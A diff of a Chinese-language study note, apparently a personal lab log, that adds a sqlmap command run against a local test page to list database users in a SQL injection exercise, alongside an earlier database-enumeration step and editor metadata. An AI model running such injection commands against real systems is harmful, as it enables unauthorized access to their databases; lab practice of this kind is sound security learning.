@@ -69,13 +69,21 @@ kali 自带 mysql，但后面还是打不开 1.php，试了好多办法还是不
 *--current-db 获取当前数据库*
 ![输入图片说明](/imgs/2023-05-08/n43hrWhDSifGhezc.png)
 
+```
+./sqlmap.py -u 'http://127.0.0.1/sql_injection/1.php?id=1&submit=submit' -p id --fresh-queries --users
+```
+*--users 查看用户*
+
+![输入图片说明](/imgs/2023-05-08/HWEfeoS2X94j6hxN.png)
+
+
 > Written with [StackEdit中文版](https://stackedit.cn/).
 >
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbMTk3OTc5NzM0LDc5NjI4MzEwOCw4ODk4Mz
-I1OTQsMTgwMzUwMTQ4NiwtNjc0NjU0OTU4LDE1ODkwNDg1ODks
-LTE4NTg4NjI5NTcsLTE1NjYzNTQxNzAsMjcxOTkwNjM0LDIzOT
-c0NzIyNiwtMjA2ODc4ODUxMiwxNjQ4NTU2NjEwLC0xODAyMzc4
-MDYwLC0xOTE1NDI2OTUsLTU5ODkwMjE1LC0zNTkxOTU3OTcsMj
-MyMDgxNzMsMTczMjY3NjE4OF19
+eyJoaXN0b3J5IjpbLTE3MTEzMzI4NTgsNzk2MjgzMTA4LDg4OT
+gzMjU5NCwxODAzNTAxNDg2LC02NzQ2NTQ5NTgsMTU4OTA0ODU4
+OSwtMTg1ODg2Mjk1NywtMTU2NjM1NDE3MCwyNzE5OTA2MzQsMj
+M5NzQ3MjI2LC0yMDY4Nzg4NTEyLDE2NDg1NTY2MTAsLTE4MDIz
+NzgwNjAsLTE5MTU0MjY5NSwtNTk4OTAyMTUsLTM1OTE5NTc5Ny
+wyMzIwODE3MywxNzMyNjc2MTg4XX0=
 -->
